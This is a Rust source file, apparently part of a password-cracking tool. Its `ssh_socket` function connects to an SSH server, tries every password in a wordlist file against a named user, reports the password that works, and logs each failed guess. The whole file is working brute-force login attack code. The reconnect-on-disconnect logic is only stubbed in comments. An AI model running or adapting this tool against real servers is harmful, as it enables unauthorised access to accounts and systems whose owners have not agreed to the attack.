use std::net::TcpStream;
use std::net::{IpAddr, SocketAddr};
use std::path::PathBuf;
use anyhow::{Context, Error};


use crate::library;

/// Convert the session error code into a simple enum we can match on.
#[derive(Debug, PartialEq)]
enum SessionError {
    Closed,          // Session(-7)
    BadPassword,     // Session(-18)
    Other(String),   // Anything else
}

impl From<&ssh2::Error> for SessionError {
    fn from(err: &ssh2::Error) -> Self {
        match err.code().to_string().as_str() {
            "Session(-7)"  => SessionError::Closed,
            "Session(-18)" => SessionError::BadPassword,
            other          => SessionError::Other(other.to_owned()),
        }
    }
}

pub fn ssh_socket(addr: String, port: u16, user: String, wordlist_path: PathBuf, config: library::Config) -> Result<bool, Error> {
    let mut cracked = false;

    // Connect to the local SSH server
    let a: IpAddr = addr.parse().expect("parse failed");
    let socket = SocketAddr::from((a, port)); 
    let tcp = TcpStream::connect(socket).unwrap();
    let mut session = ssh2::Session::new().unwrap();
    session.set_tcp_stream(tcp);
    session.handshake().unwrap();

    println!("Connected to {user}@{addr}:{port}");

    let string_wordlist = std::fs::read_to_string(wordlist_path).unwrap();

    println!("Starting to crack!");
    for line in string_wordlist.lines() {
        let attempt = session.userauth_password(&user, line);

        match attempt {
            Ok(()) => {
                println!("Match Found!\nPassword: {}", &line);
                cracked = true;
                break;
            }
            Err(err) =>
                match SessionError::from(&err) {
                    SessionError::Closed => {
                        eprintln!("Error: {}", err);
                        // attempt to reconnect to the server
                        // resume from point in wordlist
                    }
                    SessionError::BadPassword => {
                        // go to the next password in the list
                        println!("Tried: {}", &line);
                    }
                    SessionError::Other(err) => {
                        // other error
                        eprintln!("Error: {}", err);
                    }
                }
            }

            
        }

    Ok(cracked)
}

